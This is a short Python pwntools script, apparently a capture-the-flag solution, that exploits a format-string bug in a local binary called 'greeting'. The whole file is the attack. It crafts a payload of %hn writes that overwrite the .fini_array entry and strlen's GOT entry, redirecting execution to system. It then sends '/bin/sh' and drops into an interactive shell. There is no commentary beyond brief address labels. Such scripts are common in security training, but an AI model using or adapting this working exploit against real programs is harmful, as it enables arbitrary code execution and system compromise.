from pwn import *

# context.log_level = "debug"
pipe = process("./greeting")

print(pipe.recvuntil("... "))

# addr to overwrite
fini_array = 0x08049934
strlenGOT = 0x08049a54

# overwrite to
addrGetnline = 0x08048614   # low 2 byte diff
systemcall = 0x08048490 

payload = "TT"    # padding
payload += p32(fini_array)
payload += p32(strlenGOT)
payload += p32(strlenGOT+2)
payload += "%34292c%12$hn"
payload += "%65148c%13$hn"
payload += "%33652c%14$hn"

print(len(payload))

pipe.sendline(payload)

# pause()
pipe.sendline('/bin/sh')

pipe.interactive()



